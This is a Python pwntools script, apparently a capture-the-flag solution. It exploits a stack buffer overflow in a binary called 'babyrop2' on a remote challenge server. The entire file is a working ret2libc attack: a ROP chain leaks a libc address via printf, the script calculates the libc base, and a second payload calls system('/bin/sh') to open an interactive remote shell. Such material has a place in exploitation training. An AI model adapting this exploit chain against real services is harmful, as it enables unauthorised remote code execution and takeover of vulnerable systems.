from pwn import *
context.log_level = 'debug' 
#ret2libc

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')

proc_name = './babyrop2'

#p = process(proc_name)
p = remote('node3.buuoj.cn', 25378)
elf = ELF(proc_name)

printf_plt = elf.plt['printf']
read_got = elf.got['read']
main_addr = elf.sym['main']
pop_rdi_ret = 0x400733
format_str_addr = 0x400770
pop_rsi_r15_ret = 0x400731
ret = 0x4004d1

payload = b'a' * (0x20 + 8) + p64(pop_rdi_ret) + p64(format_str_addr) + p64(pop_rsi_r15_ret) 
payload += p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)
p.recvuntil('name? ')
p.sendline(payload)

p.recvuntil('again, ')
p.recvuntil('again, ')

printf_addr = u64(p.recv(6).ljust(8, b'\0'))

libc_base = printf_addr - libc.symbols['read']

print('[+] libc_base -> {}'.format(hex(libc_base)))

bin_sh = libc_base + next(libc.search(b'/bin/sh'))
system_addr = libc_base + libc.symbols['system']

payload = b'a' * (0x20 + 8) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)

p.recvuntil('name? ')
p.sendline(payload)

p.interactive()
